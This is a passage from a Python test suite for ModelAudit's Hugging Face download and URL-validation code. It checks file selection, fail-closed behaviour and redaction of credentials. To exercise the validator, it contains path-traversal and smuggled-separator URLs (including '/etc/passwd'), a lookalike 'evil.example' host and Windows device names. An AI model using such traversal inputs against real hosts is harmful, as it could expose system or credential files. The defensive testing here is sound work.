
        with patch(
            "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
            return_value=(repo_files, _HF_TEST_REVISION, None),
        ):
            results = list(
                download_model_streaming(
                    "https://huggingface.co/test/model",
                    scannable_extensions={".md"},
                    scannable_filenames={"readme"},
                )
            )

        assert results == [(readme_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="README",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(
            ["README", "weights.bin", *(f"payloads/chunk-{idx:04d}" for idx in range(129))],
            _HF_TEST_REVISION,
            None,
        ),
    )
    @patch("huggingface_hub.HfApi.get_paths_info")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_budgets_only_selected_extensionless_filename(
        self,
        mock_hf_hub_download: MagicMock,
        mock_get_paths_info: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename policy should constrain both overflow and immutable-revision size checks."""
        readme_path = tmp_path / "README"
        readme_path.write_bytes(b"readme")
        mock_hf_hub_download.return_value = str(readme_path)
        mock_get_paths_info.return_value = [SimpleNamespace(path="README", size=6)]

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                max_size=10,
                scannable_extensions={".md", ".txt"},
                scannable_filenames={"readme", "model_card"},
            )
        )

        assert results == [(readme_path, True)]
        mock_get_paths_info.assert_called_once_with("test/model", ["README"], revision=_HF_TEST_REVISION)
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="README",
            revision=_HF_TEST_REVISION,
        )

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["llama", "MODEL.UBJ"], _HF_TEST_REVISION, None),
    )
    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_xgboost_excludes_extensionless_candidates(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Explicit remote exclusions should keep XGBoost extensionless files out."""
        model_path = tmp_path / "MODEL.UBJ"
        mock_hf_hub_download.return_value = str(model_path)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".json", ".ubj"},
            )
        )

        assert results == [(model_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="MODEL.UBJ",
            revision=_HF_TEST_REVISION,
        )
        mock_detect_content.assert_called_once_with("test/model", "llama", _HF_TEST_REVISION, ANY)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="safetensors",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_extension_sniffs_renamed_files(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Scanner-specific suffix filters must not miss disguised supported artifacts."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_filenames={"readme"},
                scannable_scanner_ids={"safetensors", "metadata"},
            )
        )

        assert results == [(tmp_path / "model.safetensors", False), (tmp_path / "renamed.jpg", True)]
        assert [call.kwargs["filename"] for call in mock_hf_hub_download.call_args_list] == [
            "model.safetensors",
            "renamed.jpg",
        ]
        mock_detect_content.assert_called_once_with("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY)

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="safetensors",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_combines_extension_and_filename_route_filters(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Exact filename filters must not disable renamed routes from selected suffixes."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(b"downloaded")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_filenames={"readme"},
            )
        )

        assert results == [(tmp_path / "model.safetensors", False), (tmp_path / "renamed.jpg", True)]
        mock_detect_content.assert_called_once_with("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY)

    @pytest.mark.parametrize(
        ("hidden_payload", "expected_filenames"),
        [
            (
                b"\x80\x04\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                ["known.msgpack", "hidden.payload"],
            ),
            (
                b"(d.\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                ["known.msgpack", "hidden.payload"],
            ),
            (pickle.dumps({"ordinary": "pickle"}, protocol=4), ["known.msgpack"]),
            (pickle.dumps({"ordinary": "pickle"}, protocol=0), ["known.msgpack"]),
        ],
        ids=[
            "flax-binary-pickle-overlap",
            "flax-proto0-pickle-overlap",
            "ordinary-binary-pickle",
            "ordinary-proto0-pickle",
        ],
    )
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["known.msgpack", "hidden.payload"], _HF_TEST_REVISION, None),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_flax_preserves_pickle_overlap(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
        hidden_payload: bytes,
        expected_filenames: list[str],
        tmp_path: Path,
    ) -> None:
        """Remote Flax selection must preserve structural overlap without widening to pickle."""

        def download_side_effect(*, filename: str, **_kwargs: object) -> str:
            path = tmp_path / filename
            path.write_bytes(hidden_payload if filename == "hidden.payload" else b"\x81\xa6params\x80")
            return str(path)

        mock_hf_hub_download.side_effect = download_side_effect
        mock_requests_get.return_value = _FakeRangeResponse(hidden_payload)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
                scannable_scanner_ids={"flax_msgpack"},
            )
        )

        assert [path.name for path, _is_last in results] == expected_filenames
        assert results[-1][1] is True

    @patch("requests.get")
    def test_select_streamable_flax_excludes_large_text_owner_merges(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """A complete large tokenizer text file must not be promoted to Flax."""
        payload = ("#version: 0.2\n" + "e n\n" * 600_000).encode("utf-8")
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "merges.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files == ["known.msgpack"]

    @patch("modelaudit.utils.sources.huggingface._HF_CONTENT_SNIFF_MAX_TOTAL_BYTES", 64 * 1024)
    @patch("requests.get")
    def test_select_streamable_text_owner_uses_known_size_for_complete_probe_budget(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """Known-small tokenizer text should not reserve the full text-owner ceiling."""
        payload = ("#version: 0.2\n" + "e n\n" * 3_000).encode("utf-8")
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["known.msgpack", "a.txt", "b.txt", "c.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".msgpack", ".flax", ".orbax", ".jax"},
            scannable_scanner_ids={"flax_msgpack"},
        )

        assert selected_files == ["known.msgpack"]

    @patch("requests.get")
    def test_select_streamable_protobuf_excludes_non_ascii_bpe_text_owner(
        self,
        mock_requests_get: MagicMock,
    ) -> None:
        """BPE merge text with non-ASCII tokens must not become a protobuf candidate."""
        payload = ("#version: 0.2\n" + "Ġ hello\n" * 300_000).encode("utf-8")
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        selected_files = _select_streamable_hf_files(
            "test/model",
            ["model.onnx", "merges.txt"],
            _HF_TEST_REVISION,
            scannable_extensions={".onnx"},
            scannable_scanner_ids={"onnx"},
        )

        assert selected_files == ["model.onnx"]

    @pytest.mark.parametrize(
        ("filename", "payload", "scannable_extensions", "scannable_scanner_ids", "expected_files"),
        [
            (
                "weights.txt",
                b"\x81\xa6params\x81\xa1w\x93\x01\x02\x03",
                {".msgpack", ".flax", ".orbax", ".jax"},
                {"flax_msgpack"},
                ["known.msgpack", "weights.txt"],
            ),
            (
                "candidate.txt",
                b"\x12\xff\xff\xff\xff\xff" + (b"\x00" * ((1024 * 1024) + 1)),
                {".onnx"},
                {"onnx"},
                ["model.onnx", "candidate.txt"],
            ),
        ],
        ids=["flax-msgpack-text-suffix", "protobuf-candidate-text-suffix"],
    )
    @patch("requests.get")
    def test_select_streamable_text_suffix_retains_binary_routes(
        self,
        mock_requests_get: MagicMock,
        filename: str,
        payload: bytes,
        scannable_extensions: set[str],
        scannable_scanner_ids: set[str],
        expected_files: list[str],
    ) -> None:
        """Text-owner suffix handling must not suppress binary model candidates."""
        mock_requests_get.return_value = _FakeRangeResponse(payload)

        repo_files = [expected_files[0], filename]
        selected_files = _select_streamable_hf_files(
            "test/model",
            repo_files,
            _HF_TEST_REVISION,
            scannable_extensions=scannable_extensions,
            scannable_scanner_ids=scannable_scanner_ids,
        )

        assert selected_files == expected_files

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["model.safetensors", "renamed.jpg"], _HF_TEST_REVISION, None),
    )
    @patch(
        "modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format",
        return_value="pickle",
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_selected_extension_rejects_other_renamed_formats(
        self,
        mock_hf_hub_download: MagicMock,
        mock_detect_content: MagicMock,
        _mock_list_repo_files: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Content sniffing must not widen an explicit scanner selection."""
        model_path = tmp_path / "model.safetensors"
        model_path.write_bytes(b"downloaded")
        mock_hf_hub_download.return_value = str(model_path)

        results = list(
            download_model_streaming(
                "https://huggingface.co/test/model",
                scannable_extensions={".safetensors"},
                scannable_scanner_ids={"safetensors"},
            )
        )

        assert results == [(model_path, True)]
        mock_hf_hub_download.assert_called_once_with(
            repo_id="test/model",
            filename="model.safetensors",
            revision=_HF_TEST_REVISION,
        )
        mock_detect_content.assert_called_once_with("test/model", "renamed.jpg", _HF_TEST_REVISION, ANY)

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_known_suffix_does_not_hide_extensionless_overflow(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """Known suffixes must not suppress incomplete extensionless candidate coverage."""
        repo_files = ["model.bin", *(f"payloads/chunk-{idx:04d}" for idx in range(1000))]

        with (
            patch(
                "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
                return_value=(repo_files, _HF_TEST_REVISION, None),
            ),
            pytest.raises(
                Exception,
                match="Refusing to stream-download extensionless files from test/model: "
                "repository listing exceeds the bounded extensionless candidate limit",
            ),
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "timed out after 30 seconds"),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_timeout_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming mode should fail closed when repo listing times out."""
        with pytest.raises(Exception, match="Timeout listing files in repository test/model"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(None, None, "repository listing unavailable"),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_error_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming mode should fail closed when repo listing errors out."""
        with pytest.raises(
            Exception,
            match="Failed listing files in repository test/model: repository listing unavailable",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._detect_huggingface_content_route_format", return_value=None)
    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["README.md", "notes.txt"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_listing_success_without_scannable_files_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
        _mock_detect_content: MagicMock,
    ) -> None:
        """Streaming mode must not download every repo file when no scannable files are listed."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface._get_model_extensions", return_value={".bin"})
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=([], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_empty_listing_fails_closed(
        self,
        mock_hf_hub_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        _mock_get_extensions: MagicMock,
    ) -> None:
        """An empty successful listing should not make streaming mode download all repo files."""
        with pytest.raises(
            Exception,
            match="Refusing to download full snapshot for test/model: "
            "repository listing contains no recognized ModelAudit-scannable files",
        ):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_hf_hub_download.assert_not_called()

    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["pytorch_model.bin", "evil.payload"], None, "repository listing missing immutable revision"),
    )
    @patch("requests.get")
    @patch("huggingface_hub.hf_hub_download")
    def test_download_model_streaming_fails_closed_without_immutable_revision(
        self,
        mock_hf_hub_download: MagicMock,
        mock_requests_get: MagicMock,
        _mock_list_repo_files: MagicMock,
    ) -> None:
        """Streaming filtering must stop before probing or downloading a mutable revision."""
        with pytest.raises(Exception, match="repository listing missing immutable revision"):
            list(download_model_streaming("https://huggingface.co/test/model"))

        mock_requests_get.assert_not_called()
        mock_hf_hub_download.assert_not_called()


class TestModelSizeAndDiskSpace:
    """Test model size retrieval and disk space checking."""

    @patch("builtins.__import__")
    def test_get_model_size_import_error(self, mock_import):
        """Test get_model_size returns None when HfApi is not available."""

        def side_effect(name, *args, **kwargs):
            if name == "huggingface_hub":
                raise ImportError("No module")
            return __import__(name, *args, **kwargs)

        mock_import.side_effect = side_effect
        size = get_model_size("test/model")
        assert size is None

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_success(self, mock_hf_api_class):
        """Test successful model size retrieval."""
        # Mock the API and model info
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        # Create mock file info
        mock_file1 = MagicMock()
        mock_file1.size = 1024 * 1024  # 1 MB
        mock_file2 = MagicMock()
        mock_file2.size = 2048 * 1024  # 2 MB

        mock_model_info = MagicMock()
        mock_model_info.siblings = [mock_file1, mock_file2]
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model")
        assert size == 3 * 1024 * 1024  # 3 MB total

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_no_siblings(self, mock_hf_api_class):
        """Test model size when no siblings info available."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        mock_model_info = MagicMock()
        mock_model_info.siblings = None
        mock_api.model_info.return_value = mock_model_info

        size = get_model_size("test/model")
        assert size is None

    @patch("huggingface_hub.HfApi")
    def test_get_model_size_api_error(self, mock_hf_api_class):
        """Test model size returns None on API error."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api
        mock_api.model_info.side_effect = Exception("API error")

        size = get_model_size("test/model")
        assert size is None

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_insufficient_disk_space(
        self, mock_snapshot_download, mock_check_disk_space, mock_get_model_size, tmp_path
    ):
        """Test download fails gracefully when disk space is insufficient (with custom cache)."""
        # Mock model size
        mock_get_model_size.return_value = 10 * 1024 * 1024 * 1024  # 10 GB

        # Mock disk space check to fail
        mock_check_disk_space.return_value = (False, "Insufficient disk space. Required: 12.0 GB, Available: 5.0 GB")

        # Test download failure with custom cache directory (this enables disk space checking)
        cache_dir = tmp_path / "custom_cache"
        with pytest.raises(Exception, match=r"Cannot download model.*Insufficient disk space"):
            download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        # Verify snapshot_download was not called
        mock_snapshot_download.assert_not_called()

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_with_disk_space_check(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Test successful download with disk space check when using custom cache."""
        # Mock model size
        mock_get_model_size.return_value = 1024 * 1024 * 1024  # 1 GB

        # Mock disk space check to pass
        mock_check_disk_space.return_value = (True, "Sufficient disk space available (10.0 GB)")

        # Mock snapshot download
        mock_path = tmp_path / "test_model"
        mock_path.mkdir()
        (mock_path / "config.json").write_text("{}")
        (mock_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(mock_path)

        # Test download with custom cache directory (this enables disk space checking)
        cache_dir = tmp_path / "custom_cache"
        result = download_model("https://huggingface.co/test/model", cache_dir=cache_dir)

        # Verify disk space was checked
        mock_check_disk_space.assert_called_once()

        # Verify download proceeded
        mock_snapshot_download.assert_called_once()
        assert result == mock_path

    @patch("modelaudit.utils.sources.huggingface.get_model_size")
    @patch("modelaudit.utils.sources.huggingface.check_disk_space")
    @patch("modelaudit.utils.sources.huggingface._get_hf_cache_root")
    @patch(
        "modelaudit.utils.sources.huggingface._list_repo_files_with_timeout",
        return_value=(["config.json", "pytorch_model.bin"], _HF_TEST_REVISION, None),
    )
    @patch("huggingface_hub.snapshot_download")
    def test_download_model_without_cache_dir_checks_default_hf_cache(
        self,
        mock_snapshot_download: MagicMock,
        _mock_list_repo_files: MagicMock,
        mock_get_hf_cache_root: MagicMock,
        mock_check_disk_space: MagicMock,
        mock_get_model_size: MagicMock,
        tmp_path: Path,
    ) -> None:
        """Disk preflight should run against the default HF cache root when no cache_dir is supplied."""
        mock_get_model_size.return_value = 1024 * 1024
        mock_check_disk_space.return_value = (True, "Sufficient disk space available")

        hf_cache_root = tmp_path / "hf-cache" / "hub"
        mock_get_hf_cache_root.return_value = hf_cache_root

        download_path = tmp_path / "download"
        download_path.mkdir()
        (download_path / "config.json").write_text("{}")
        (download_path / "pytorch_model.bin").write_bytes(b"weights")
        mock_snapshot_download.return_value = str(download_path)

        download_model("https://huggingface.co/test/model")

        assert hf_cache_root.exists()
        mock_check_disk_space.assert_called_once_with(hf_cache_root, 1024 * 1024)


class TestGetModelInfo:
    """Test retrieving model metadata from HuggingFace."""

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_with_author(self, mock_hf_api_class):
        """Ensure author is returned when available."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        model_info = SimpleNamespace(
            modelId="test/model",
            author="test-author",
        )
        mock_api.model_info.return_value = model_info

        # Mock list_repo_tree which is used to get accurate file sizes
        # (implementation skips .gitattributes and README.md)
        mock_api.list_repo_tree.return_value = [
            SimpleNamespace(path="config.json", size=100),
            SimpleNamespace(path="README.md", size=50),  # This will be skipped
        ]

        info = get_model_info("https://huggingface.co/test/model")

        assert info["author"] == "test-author"
        assert info["total_size"] == 100
        assert info["file_count"] == 1

    @patch("huggingface_hub.HfApi")
    def test_get_model_info_without_author(self, mock_hf_api_class):
        """Default to empty string when author is missing."""
        mock_api = MagicMock()
        mock_hf_api_class.return_value = mock_api

        model_info = SimpleNamespace(
            siblings=[],
            modelId="test/model",
        )
        mock_api.model_info.return_value = model_info

        info = get_model_info("https://huggingface.co/test/model")

        assert info["author"] == ""


class TestHuggingFaceFileURLs:
    """Test HuggingFace direct file URL handling."""

    def test_redact_file_url_for_display(self):
        """Redact credentials from HuggingFace URLs while keeping useful location context."""
        url = "https://user:pass@huggingface.co/org/repo/resolve/main/model.bin?token=hf_secret#frag"

        redacted = redact_huggingface_url_for_display(url)

        assert redacted == "https://huggingface.co/org/repo/resolve/main/model.bin"
        assert "user" not in redacted
        assert "pass" not in redacted
        assert "token=" not in redacted
        assert "hf_secret" not in redacted
        assert "#frag" not in redacted

    def test_invalid_host_error_redacts_credentials_and_query(self) -> None:
        """Rejected lookalike hosts must not echo secrets in validation errors."""
        url = "https://alice:password@evil.example/org/repo/resolve/main/model.bin?token=secret#frag"

        with pytest.raises(ValueError) as exc_info:
            parse_huggingface_file_url(url)

        message = str(exc_info.value)
        assert "evil.example/org/repo/resolve/main/model.bin" in message
        assert "alice" not in message
        assert "password" not in message
        assert "token=" not in message
        assert "secret" not in message

    @pytest.mark.parametrize(
        "url",
        [
            "ftp://alice:password@huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "https:huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "https:alice:password@huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "javascript:huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
            "https://alice:password@huggingface.co\uff0fevil/org/repo/resolve/main/model.bin?token=secret#frag",
            "https://alice:password\uff20huggingface.co/org/repo/resolve/main/model.bin?token=secret#frag",
        ],
    )
    def test_invalid_url_error_redacts_credentials_and_query(self, url: str) -> None:
        """Rejected schemes, authorities, and netlocs must not echo embedded secrets."""

        with pytest.raises(ValueError) as exc_info:
            parse_huggingface_file_url(url)

        message = str(exc_info.value)
        assert "alice" not in message
        assert "password" not in message
        assert "token=" not in message
        assert "secret" not in message

    def test_valid_file_urls(self) -> None:
        """Test that valid HuggingFace file URLs are detected."""
        valid_urls = [
            "https://huggingface.co/gpt2/resolve/main/config.json",
            "https://huggingface.co/bert-base/uncased/resolve/main/pytorch_model.bin",
            "https://huggingface.co/facebook/bart-large/resolve/main/config.json",
            "https://hf.co/microsoft/DialoGPT/resolve/main/model.safetensors",
            "https://hf.co/facebook/bart-large/resolve/main/subfolder/model.safetensors",
            "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/file.bin",
            "https://huggingface.co/user/repo/resolve/feature%2Ffoo/file.bin",
            "https://huggingface.co/user/repo/resolve/v1.0/model%20file.bin",
            "https://user:pass@huggingface.co/private/repo/resolve/main/model.bin?token=hf_secret",
        ]
        for url in valid_urls:
            assert is_huggingface_file_url(url), f"Failed to detect valid file URL: {url}"

    def test_invalid_file_urls(self) -> None:
        """Test that invalid URLs are not detected as HuggingFace file URLs."""
        invalid_urls = [
            "https://huggingface.co/bert-base-uncased",  # Model URL, not file URL
            "https://github.com/user/repo/blob/main/file.bin",  # GitHub, not HuggingFace
            "https://huggingface.co/model/tree/main",  # Tree view, not resolve
            "/path/to/local/file.bin",  # Local path
        ]
        for url in invalid_urls:
            assert not is_huggingface_file_url(url), f"Incorrectly detected invalid file URL: {url}"

    def test_parse_file_urls(self) -> None:
        """Test parsing HuggingFace file URLs."""
        test_cases = [
            (
                "https://huggingface.co/gpt2/resolve/main/config.json",
                ("gpt2", "main", "config.json"),
            ),
            (
                f"https://huggingface.co/{'a' * 47}/{'b' * 48}/resolve/main/model.bin",
                (f"{'a' * 47}/{'b' * 48}", "main", "model.bin"),
            ),
            (
                "https://huggingface.co/bert-base/uncased/resolve/main/pytorch_model.bin",
                ("bert-base/uncased", "main", "pytorch_model.bin"),
            ),
            (
                "https://huggingface.co/microsoft/DialoGPT/resolve/v1.0/config.json",
                ("microsoft/DialoGPT", "v1.0", "config.json"),
            ),
            (
                "https://hf.co/facebook/bart-large/resolve/main/subfolder/model.safetensors",
                ("facebook/bart-large", "main", "subfolder/model.safetensors"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/refs%2Fpr%2F1/file.bin",
                ("user/repo", "refs/pr/1", "file.bin"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/feature%2Ffoo/file.bin",
                ("user/repo", "feature/foo", "file.bin"),
            ),
            (
                "https://huggingface.co/user/repo/resolve/v1.0/model%20file.bin",
                ("user/repo", "v1.0", "model file.bin"),
            ),
            (
                "https://user:pass@huggingface.co/private/repo/resolve/main/model.bin?token=hf_secret",
                ("private/repo", "main", "model.bin"),
            ),
        ]
        for url, expected in test_cases:
            repo_id, branch, filename = parse_huggingface_file_url(url)
            assert (repo_id, branch, filename) == expected, f"Failed to parse file URL: {url}"

    def test_parse_invalid_file_urls(self) -> None:
        """Test that invalid file URLs raise ValueError."""
        invalid_urls = [
            "https://github.com/user/repo/blob/main/file.bin",
            "https://huggingface.co/model",  # Missing resolve path
            "https://huggingface.co/model/tree/main/file.bin",  # Wrong path structure
        ]
        for url in invalid_urls:
            with pytest.raises(ValueError):
                parse_huggingface_file_url(url)

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/%2e%2e/repo/resolve/main/model.bin",
            "https://huggingface.co/org/%2e%2e/resolve/main/model.bin",
            "https://huggingface.co/org/repo%2Fescape/resolve/main/model.bin",
        ],
    )
    def test_parse_file_url_rejects_unsafe_repo_components(self, url: str) -> None:
        """Direct file URLs should validate repo-id components before download."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @pytest.mark.parametrize(
        "url",
        [
            "https://huggingface.co/test/model/resolve/%2e%2e/model.bin",
            "https://huggingface.co/test/model/resolve/%2e%2e%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/refs%2F..%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/main%2F/model.bin",
            "https://huggingface.co/test/model/resolve/refs%2F%2Fmain/model.bin",
            "https://huggingface.co/test/model/resolve/refs%5Cmain/model.bin",
            "https://huggingface.co/test/model/resolve/main/%2e%2e%2Fsecrets.bin",
            "https://huggingface.co/test/model/resolve/main/subdir%2Fmodel.bin",
            "https://huggingface.co/test/model/resolve/main/%2Fetc%2Fpasswd",
            "https://huggingface.co/test/model/resolve/main/../model.bin",
            "https://huggingface.co/test/model/resolve/main//model.bin",
            "https://huggingface.co/test/model/resolve/main/model.bin/",
        ],
    )
    def test_parse_file_url_rejects_unsafe_revision_or_filename_components(self, url: str) -> None:
        """Direct file URLs must not smuggle traversal or separators into SDK paths."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @pytest.mark.parametrize(
        "url",
        [
            "ftp://huggingface.co/test/model/resolve/main/model.bin",
            "//huggingface.co/test/model/resolve/main/model.bin",
            "https://huggingface.co:invalid/test/model/resolve/main/model.bin",
            "https://huggingface.co:444/test/model/resolve/main/model.bin",
            "https://huggingface.co/foo/resolve/resolve/main/file.bin",
            f"https://huggingface.co/{'a' * 48}/{'b' * 48}/resolve/main/model.bin",
            "https://huggingface.co/test%FF/model/resolve/main/model.bin",
            "https://huggingface.co/test/model/resolve/rev%FF/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%FF.bin",
            "https://huggingface.co/test/model/resolve/main/model%00.bin",
            "https://huggingface.co/test/model/resolve/rev%/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%ZZ.bin",
            "https://huggingface.co/test/model/resolve/%C2%85/model.bin",
            "https://huggingface.co/test/model/resolve/main/model%C2%85.bin",
            "https://huggingface.co/test/model/resolve/main/model\ud800.bin",
            "\x00https://huggingface.co/test/model/resolve/main/model.bin",
            " https://huggingface.co/test/model/resolve/main/model.bin",
            "https://huggingface.co/te\nst/model/resolve/main/model.bin",
            "https://huggingface.co/test/model/resolve/ma\tin/model.bin",
            "https://huggingface.co/test/model/resolve/main/model\r.bin",
        ],
    )
    def test_parse_file_url_rejects_ambiguous_or_sdk_invalid_components(self, url: str) -> None:
        """Validation should reject lossy decoding and repo IDs the SDK cannot accept."""
        with pytest.raises(ValueError):
            parse_huggingface_file_url(url)

        assert is_huggingface_file_url(url) is False

    @pytest.mark.parametrize(
        "filename",
        [
            "..%20",
            "C%3A",
            "CON",
            "CONIN%24",
            "conout%24.log",
            "COM%C2%B9",
            "LPT%C2%B2.log",
            "nul.txt",
            "model.bin.",
            "model.bin%20",
            "model.bin%3Astream",
            "model%3F.bin",
            "subdir%5Cmodel.bin",
        ],
    )
